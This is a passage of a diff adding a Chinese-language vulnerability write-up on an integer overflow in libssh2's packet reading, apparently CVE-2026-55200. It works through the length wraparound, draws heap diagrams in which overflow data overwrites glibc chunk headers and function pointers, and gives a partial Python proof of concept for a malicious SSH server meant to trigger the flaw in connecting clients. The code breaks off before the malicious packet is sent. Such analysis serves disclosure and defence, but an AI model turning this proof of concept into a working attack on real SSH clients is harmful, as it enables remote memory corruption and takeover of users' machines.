+<span class="w">  </span><span class="n">block_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">8</span><span class="w">    </span><span class="p">(</span><span class="n">AES</span><span class="o">-</span><span class="mi">128</span><span class="o">-</span><span class="n">CBC的块大小</span><span class="p">)</span>
+<span class="w">  </span><span class="n">mac_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">       </span><span class="p">(</span><span class="err">加密建立前无</span><span class="n">MAC</span><span class="p">)</span>
+<span class="w">  </span><span class="n">auth_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">16</span><span class="w">     </span><span class="p">(</span><span class="n">AEAD认证数据长度</span><span class="p">)</span>
+
+<span class="err">计算过程</span><span class="p">:</span>
+<span class="w">  </span><span class="n">total_num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="w">                          </span><span class="o">//</span><span class="w"> </span><span class="n">packet_length字段自身</span>
+<span class="w">  </span><span class="n">total_num</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">packet_length</span><span class="w">             </span><span class="o">//</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00000003</span><span class="w"> </span><span class="p">(</span><span class="err">回绕</span><span class="o">!</span><span class="p">)</span>
+<span class="w">  </span><span class="n">total_num</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">mac_len</span><span class="w">                   </span><span class="o">//</span><span class="w"> </span><span class="mh">0x3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x3</span>
+<span class="w">  </span><span class="n">total_num</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">auth_len</span><span class="w">                  </span><span class="o">//</span><span class="w"> </span><span class="mh">0x3</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x13</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">19</span>
+
+<span class="w">  </span><span class="err">结果</span><span class="p">:</span><span class="w"> </span><span class="n">total_num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">19</span>
+
+<span class="err">验证</span><span class="p">:</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span>
+<span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">20</span>
+<span class="w">     </span><span class="o">=</span><span class="w"> </span><span class="mh">0x100000013</span>
+<span class="w">     </span><span class="err">截断为</span><span class="mi">32</span><span class="err">位</span><span class="p">:</span><span class="w"> </span><span class="mh">0x00000013</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">19</span><span class="w">  </span><span class="err">✓</span>
+
+<span class="err">分配</span><span class="p">:</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">19</span><span class="p">)</span><span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="mi">19</span><span class="err">字节的堆缓冲区</span>
+<span class="err">写入</span><span class="p">:</span><span class="w"> </span><span class="n">recv</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">  </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">向</span><span class="mi">19</span><span class="err">字节缓冲区写入约</span><span class="mi">4</span><span class="n">GB数据</span>
+<span class="err">结果</span><span class="p">:</span><span class="w"> </span><span class="err">堆溢出，覆盖相邻堆内存结构</span>
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code><span class="err">堆内存布局</span><span class="w"> </span><span class="p">(</span><span class="err">溢出前</span><span class="p">):</span>
+
+<span class="err">┌────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">  </span><span class="err">堆内存</span><span class="w">                                                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌──────────┐</span><span class="w">  </span><span class="err">┌──────────┐</span><span class="w">  </span><span class="err">┌──────────────────────┐</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="mi">19</span><span class="err">字节</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">相邻堆</span><span class="w">   </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">其他分配的堆块</span><span class="w">      </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w">   </span><span class="err">│</span><span class="o">-&gt;</span><span class="err">│</span><span class="w"> </span><span class="err">元数据</span><span class="w">   </span><span class="err">│</span><span class="o">-&gt;</span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="err">可能包含函数指针</span><span class="p">)</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">缓冲区</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="p">(</span><span class="n">chunk</span><span class="w">   </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">           </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="n">header</span><span class="p">)</span><span class="w"> </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">                      </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──────────┘</span><span class="w">  </span><span class="err">└──────────┘</span><span class="w">  </span><span class="err">└──────────────────────┘</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">malloc</span><span class="p">(</span><span class="mi">19</span><span class="p">)</span><span class="err">分配</span><span class="w">   </span><span class="n">glibc管理</span><span class="w">      </span><span class="err">堆上的其他对象</span><span class="w">         </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                        </span><span class="err">│</span>
+<span class="err">└────────────────────────────────────────────────────────┘</span>
+
+<span class="err">堆内存布局</span><span class="w"> </span><span class="p">(</span><span class="err">溢出后</span><span class="p">):</span>
+
+<span class="err">┌────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">  </span><span class="err">堆内存</span><span class="w">                                                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌──────────┐</span><span class="w">  </span><span class="err">┌──────────┐</span><span class="w">  </span><span class="err">┌──────────────────────┐</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="mi">19</span><span class="err">字节</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">被覆盖的</span><span class="w"> </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">被攻击者数据覆盖</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">payload</span><span class="w">   </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">堆元数据</span><span class="w"> </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">的堆块</span><span class="w">              </span><span class="err">│</span><span class="w"> </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">缓冲区</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="p">(</span><span class="err">攻击者</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="p">(</span><span class="err">函数指针被覆写</span><span class="w">     </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="o">+</span><span class="err">溢出数据</span><span class="w"> </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="err">控制</span><span class="p">)</span><span class="w">   </span><span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">   </span><span class="err">为</span><span class="n">system</span><span class="p">()</span><span class="err">地址</span><span class="p">)</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──────────┘</span><span class="w">  </span><span class="err">└──────────┘</span><span class="w">  </span><span class="err">└──────────────────────┘</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">       </span><span class="err">│</span><span class="w">                                                        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">       </span><span class="n">v</span><span class="w">                                                        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">攻击者通过溢出数据控制</span><span class="p">:</span><span class="w">                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mf">1.</span><span class="w"> </span><span class="n">glibc</span><span class="w"> </span><span class="n">chunk</span><span class="w"> </span><span class="n">header</span><span class="w"> </span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">bk指针</span><span class="p">)</span><span class="w">                     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mf">2.</span><span class="w"> </span><span class="err">相邻堆对象的内容</span><span class="w">                                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mf">3.</span><span class="w"> </span><span class="err">可能的函数指针</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">劫持控制流</span><span class="w">                               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                        </span><span class="err">│</span>
+<span class="err">└────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<h3>3.5 恶意SSH服务器PoC框架</h3>
+<p>以下是一个Python编写的恶意SSH服务器框架，用于触发CVE-2026-55200的整数溢出：</p>
+<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python3</span>
+<span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">恶意SSH服务器 PoC 框架 - CVE-2026-55200</span>
+<span class="sd">触发 libssh2 ssh2_transport_read() 中的整数溢出至堆溢出</span>
+
+<span class="sd">注意: 此PoC仅为漏洞验证框架，不包含完整的堆布局利用。</span>
+<span class="sd">完整利用需要: ASLR绕过 + 堆布局控制 + ROP链构造。</span>
+
+<span class="sd">参考: github.com/bikini/exploitarium/tree/main/libssh2-cve-2026-55200-poc</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">threading</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Optional</span>
+
+<span class="c1"># SSH 协议常量</span>
+<span class="n">SSH_BANNER_SERVER</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;SSH-2.0-malicious_server_1.0</span><span class="se">\r\n</span><span class="s2">&quot;</span>
+<span class="n">SSH_MSG_KEXINIT</span> <span class="o">=</span> <span class="mi">20</span>
+<span class="n">SSH_MSG_NEWKEYS</span> <span class="o">=</span> <span class="mi">21</span>
+
+<span class="c1"># 恶意 packet_length 值 - 触发整数溢出</span>
+<span class="n">MALICIOUS_PACKET_LENGTH</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>  <span class="c1"># 4294967295, 回绕为约19字节</span>
+
+
+<span class="k">class</span><span class="w"> </span><span class="nc">MaliciousSSHServer</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;恶意SSH服务器，触发CVE-2026-55200整数溢出&quot;&quot;&quot;</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">host</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">2222</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">host</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">port</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">server_socket</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">False</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;启动恶意SSH服务器&quot;&quot;&quot;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">server_socket</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">server_socket</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="p">))</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">server_socket</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">running</span> <span class="o">=</span> <span class="kc">True</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 恶意SSH服务器监听在 </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">port</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 等待客户端连接...&quot;</span><span class="p">)</span>
+
+        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">running</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">client_sock</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_socket</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 客户端连接来自: </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+                <span class="c1"># 为每个客户端创建线程</span>
+                <span class="n">client_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span>
+                    <span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">handle_client</span><span class="p">,</span>
+                    <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">client_sock</span><span class="p">,</span> <span class="n">addr</span><span class="p">),</span>
+                    <span class="n">daemon</span><span class="o">=</span><span class="kc">True</span>
+                <span class="p">)</span>
+                <span class="n">client_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+            <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
+                <span class="k">break</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">handle_client</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">addr</span><span class="p">:</span> <span class="nb">tuple</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;处理客户端连接 - 执行恶意握手&quot;&quot;&quot;</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="c1"># 阶段1: 版本字符串交换</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">exchange_banners</span><span class="p">(</span><span class="n">client_sock</span><span class="p">)</span>
+
+            <span class="c1"># 阶段2: 接收客户端的 KEXINIT</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">receive_client_kexinit</span><span class="p">(</span><span class="n">client_sock</span><span class="p">)</span>
+
+            <span class="c1"># 阶段3: 发送服务器的 KEXINIT (正常)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">send_server_kexinit</span><span class="p">(</span><span class="n">client_sock</span><span class="p">)</span>
+
+            <span class="c1"># 阶段4: 密钥交换 (简化: 跳过真实DH交换)</span>
+            <span class="c1"># 在真实利用中，需要完成完整的密钥交换</span>
+            <span class="c1"># 以建立加密通道，然后在加密层注入恶意包</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">simulate_key_exchange</span><span class="p">(</span><span class="n">client_sock</span><span class="p">)</span>
+
+            <span class="c1"># 阶段5: 发送恶意数据包 - 触发整数溢出</span>
+            <span class="c1"># 注意: 在加密建立后，恶意包需要加密</span>
+            <span class="c1"># 此处展示明文阶段的触发方式</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">send_malicious_packet</span><span class="p">(</span><span class="n">client_sock</span><span class="p">)</span>
+
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 恶意数据包已发送给 </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 如果客户端使用受影响的libssh2版本，&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    ssh2_transport_read() 将发生整数溢出&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    packet_length=0xFFFFFFFF -&gt; 回绕为19字节分配&quot;</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    随后按4GB语义写入 -&gt; 堆溢出&quot;</span><span class="p">)</span>
+
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[-] 处理客户端 </span><span class="si">{</span><span class="n">addr</span><span class="si">}</span><span class="s2"> 时出错: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">finally</span><span class="p">:</span>
+            <span class="n">client_sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">exchange_banners</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;SSH版本字符串交换&quot;&quot;&quot;</span>
+        <span class="c1"># 接收客户端banner</span>
+        <span class="n">client_banner</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
+        <span class="k">while</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">client_banner</span><span class="p">:</span>
+            <span class="n">client_banner</span> <span class="o">+=</span> <span class="n">client_sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 客户端banner: </span><span class="si">{</span><span class="n">client_banner</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="c1"># 发送服务器banner</span>
+        <span class="n">client_sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">SSH_BANNER_SERVER</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 服务器banner已发送&quot;</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">receive_client_kexinit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;接收客户端的KEXINIT消息&quot;&quot;&quot;</span>
+        <span class="c1"># 读取packet_length (前4字节)</span>
+        <span class="n">length_data</span> <span class="o">=</span> <span class="n">client_sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+        <span class="n">packet_length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">length_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+
+        <span class="c1"># 读取剩余数据</span>
+        <span class="n">packet_data</span> <span class="o">=</span> <span class="n">client_sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">packet_length</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] 收到客户端KEXINIT (长度: </span><span class="si">{</span><span class="n">packet_length</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">send_server_kexinit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;发送服务器的KEXINIT消息 (正常包)&quot;&quot;&quot;</span>
+        <span class="c1"># 构造KEXINIT payload</span>
+        <span class="n">cookie</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+
+        <span class="c1"># 算法列表 (简化)</span>
+        <span class="n">kex_algorithms</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;curve25519-sha256&quot;</span>
+        <span class="n">server_host_key_algorithms</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;rsa-sha2-512&quot;</span>
+        <span class="n">encryption_algorithms</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;aes128-ctr&quot;</span>
+        <span class="n">mac_algorithms</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;hmac-sha2-256&quot;</span>
+        <span class="n">compression_algorithms</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;none&quot;</span>
+
+        <span class="c1"># 构造KEXINIT消息</span>
+        <span class="n">msg_type</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="n">SSH_MSG_KEXINIT</span><span class="p">)</span>
+        <span class="n">kexinit_payload</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="n">msg_type</span> <span class="o">+</span>
+            <span class="n">cookie</span> <span class="o">+</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">kex_algorithms</span><span class="p">)</span> <span class="o">+</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">kex_algorithms</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># 客户端-&gt;服务器</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">server_host_key_algorithms</span><span class="p">)</span> <span class="o">+</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">server_host_key_algorithms</span><span class="p">)</span> <span class="o">+</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">encryption_algorithms</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># 客户端-&gt;服务器</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">encryption_algorithms</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># 服务器-&gt;客户端</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">mac_algorithms</span><span class="p">)</span> <span class="o">+</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">mac_algorithms</span><span class="p">)</span> <span class="o">+</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">compression_algorithms</span><span class="p">)</span> <span class="o">+</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="n">compression_algorithms</span><span class="p">)</span> <span class="o">+</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="o">+</span>  <span class="c1"># languages</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_pack_string</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="o">+</span>
+            <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">+</span>  <span class="c1"># first_kex_packet_follows</span>
+            <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>  <span class="c1"># reserved</span>
+        <span class="p">)</span>
+
+        <span class="c1"># 计算padding</span>
+        <span class="n">padding_length</span> <span class="o">=</span> <span class="mi">8</span> <span class="o">-</span> <span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">kexinit_payload</span><span class="p">)</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">padding_length</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+            <span class="n">padding_length</span> <span class="o">+=</span> <span class="mi">8</span>
+
+        <span class="n">padding</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="n">padding_length</span><span class="p">)</span>
+
+        <span class="c1"># 构造完整包</span>
+        <span class="n">packet_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">kexinit_payload</span><span class="p">)</span> <span class="o">+</span> <span class="n">padding_length</span> <span class="o">+</span> <span class="mi">1</span>
+        <span class="n">packet</span> <span class="o">=</span> <span class="p">(</span>
+            <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="n">packet_length</span><span class="p">)</span> <span class="o">+</span>
+            <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="p">,</span> <span class="n">padding_length</span><span class="p">)</span> <span class="o">+</span>
+            <span class="n">kexinit_payload</span> <span class="o">+</span>
+            <span class="n">padding</span>
+        <span class="p">)</span>
+
+        <span class="n">client_sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[*] 服务器KEXINIT已发送 (正常包, 长度: </span><span class="si">{</span><span class="n">packet_length</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+
+    <span class="k">def</span><span class="w"> </span><span class="nf">simulate_key_exchange</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">):</span>
